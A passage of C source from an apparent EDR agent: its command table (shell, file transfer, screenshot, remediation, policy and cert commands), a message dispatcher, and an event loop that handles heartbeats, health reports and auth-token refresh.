    cmd_table_insert(d, "file.upload",            cmd_file_upload);
    cmd_table_insert(d, "file.install",           cmd_install);
    cmd_table_insert(d, "file-send",              cmd_file_send);
    cmd_table_insert(d, "file-recv",              cmd_file_recv);
    cmd_table_insert(d, "upload",                 cmd_upload_file);
    cmd_table_insert(d, "shell",                  cmd_shell);
#ifdef _WIN32
    cmd_table_insert(d, "screenshot",             cmd_screenshot);
#endif
    cmd_table_insert(d, "remediate.kill",         cmd_remediate_kill);
    cmd_table_insert(d, "remediate.quarantine",   cmd_remediate_quarantine);
    cmd_table_insert(d, "remediate.isolate",      cmd_remediate_isolate);
    cmd_table_insert(d, "policy.pull",            cmd_policy_pull);
    cmd_table_insert(d, "health.report",          cmd_health_report);
    cmd_table_insert(d, "auth.rotate_cert",       cmd_auth_rotate_cert);
}

/* -------------------------------------------------------------------------
 * Public command dispatch entry point
 * -------------------------------------------------------------------------*/

edr_status_t edr_dispatcher_dispatch(edr_dispatcher_t   *d,
                                      const edr_message_t *msg,
                                      edr_completion_cb_t  response_cb,
                                      void                *ctx)
{
    if (!d || !msg) return EDR_ERR_INVALID_ARG;

    dispatch_fn_t fn = cmd_table_lookup(d, msg->command_id);
    if (!fn) {
        dispatcher_log(d, EDR_LOG_WARN, "dispatcher",
                       "Unknown command_id '%s'", msg->command_id);
        return EDR_ERR_NOT_IMPL;
    }

    dispatcher_log(d, EDR_LOG_DEBUG, "dispatcher",
                   "Dispatching command '%s' seq=%llu",
                   msg->command_id, (unsigned long long)msg->seq);

    return fn(d, msg, response_cb, ctx);
}

/* -------------------------------------------------------------------------
 * Inbound message receive handler (called by comm plugin)
 * -------------------------------------------------------------------------*/

void dispatcher_recv_handler(const edr_message_t *msg, void *ctx)
{
    edr_dispatcher_t *d = (edr_dispatcher_t *)ctx;
    if (!msg || !d) return;

    if (msg->type == EDR_MSG_HEARTBEAT) {
        /* Echo heartbeat back; no full dispatch needed. */
        const edr_iface_comm_t *comm = edr_get_comm(d);
        if (comm && comm->heartbeat) comm->heartbeat(NULL, NULL);
        return;
    }

    /* Dispatch command; response_cb left NULL — individual handlers
     * send responses via the event stream or a future response queue. */
    edr_dispatcher_dispatch(d, msg, NULL, NULL);
}

/* -------------------------------------------------------------------------
 * Event loop thread — timers for heartbeat and health reporting
 * -------------------------------------------------------------------------*/

static void *event_loop_thread(void *arg)
{
    edr_dispatcher_t *d = (edr_dispatcher_t *)arg;

    uint32_t hb_ms  = d->cfg.heartbeat_interval_ms  ? d->cfg.heartbeat_interval_ms  : 30000;
    uint32_t hr_ms  = d->cfg.health_report_interval_ms;

    d->last_heartbeat    = time(NULL);
    d->last_health_report = time(NULL);

    while (1) {
        pthread_mutex_lock(&d->loop_mu);
        if (!d->running) {
            pthread_mutex_unlock(&d->loop_mu);
            break;
        }
        /* Wait up to 1 s so timers stay reasonably accurate. */
        struct timespec ts;
        clock_gettime(CLOCK_REALTIME, &ts);
        ts.tv_sec += 1;
        pthread_cond_timedwait(&d->loop_cond, &d->loop_mu, &ts);
        int still_running = d->running;
        pthread_mutex_unlock(&d->loop_mu);

        if (!still_running) break;

        time_t now = time(NULL);

        /* Heartbeat */
        if ((uint32_t)((now - d->last_heartbeat) * 1000) >= hb_ms) {
            const edr_iface_comm_t *comm = edr_get_comm(d);
            if (comm && comm->heartbeat) comm->heartbeat(NULL, NULL);
            d->last_heartbeat = now;
        }

        /* Health report */
        if (hr_ms > 0 &&
            (uint32_t)((now - d->last_health_report) * 1000) >= hr_ms)
        {
            const edr_iface_health_t *h = edr_get_health(d);
            if (h && h->report) h->report(NULL, NULL);
            d->last_health_report = now;
        }

        /* Token refresh — check every loop tick */
        const edr_iface_auth_t *auth = edr_get_auth(d);
        if (auth && auth->get_current_token && auth->refresh_token) {
            edr_auth_token_t tok;
            if (auth->get_current_token(&tok) == EDR_OK) {
                /* Refresh if less than 5 minutes to expiry */
                if (tok.expires_at > 0 &&
                    (tok.expires_at - now) < 300)
                {
                    auth->refresh_token(&tok, NULL, NULL);
                }
            }
        }
    }

    return NULL;
}

/* -------------------------------------------------------------------------
 * Internal logger
 * -------------------------------------------------------------------------*/

static void dispatcher_log(edr_dispatcher_t *d, edr_log_level_t lvl,
                             const char *comp, const char *fmt, ...)
{
    if (d && d->cfg.log) {
        va_list ap;
        va_start(ap, fmt);
        /* The log_fn_t signature takes variadic args; wrap in a local buffer. */
        char buf[1024];
        vsnprintf(buf, sizeof(buf), fmt, ap);
        va_end(ap);
        d->cfg.log(lvl, comp, "%s", buf);
    } else {
        /* Fallback: stderr */
        static const char *lvl_str[] = {"DEBUG","INFO","WARN","ERROR","FATAL"};
        va_list ap;
        va_start(ap, fmt);
        fprintf(stderr, "[%s][%s] ", lvl_str[lvl < 5 ? lvl : 4], comp);
        vfprintf(stderr, fmt, ap);
        fprintf(stderr, "\n");
        va_end(ap);
    }
}
